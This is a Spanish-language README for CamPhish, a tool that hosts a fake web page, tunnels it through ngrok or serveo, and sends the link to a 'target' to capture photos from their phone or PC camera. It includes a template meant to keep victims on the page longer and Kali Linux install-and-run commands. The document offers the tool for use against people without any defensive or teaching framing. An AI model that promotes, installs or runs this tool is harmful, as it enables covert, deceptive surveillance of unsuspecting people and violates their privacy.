# CamPhish
CamPhish es una herramienta que permite tomar fotografías de la cámara frontal del teléfono objetivo o la cámara web de la PC. CamPhish aloja un sitio web falso en un servidor php integrado y usa ngrok o serveo para generar un enlace para enviar al objetivo, que se puede usar a través de Internet. El sitio web solicita permiso de la cámara y, si el objetivo lo permite, esta herramienta toma capturas de la cámara del dispositivo objetivo.

## Características
Este repositorio cuenta con una plantilla para la página web para que el objetivo se mantenga más tiempo en la página y se puedan obtener más fotografías.

# Instalación y requerimientos
Esta herramienta requiere PHP para el servidor web y SSH.
``` 
apt-get -y install php openssh git wget
```
## Instalación en la terminal de Kali Linux:
```
git clone https://github.com/JessAT18/CamPhish.git
cd CamPhish
chmod u+x camphish.sh
bash camphish.sh
```
## Video tutorial
Proximamente

--------------------------------------------------------------------------------
Inspirado en: https://github.com/techchipnet/CamPhish
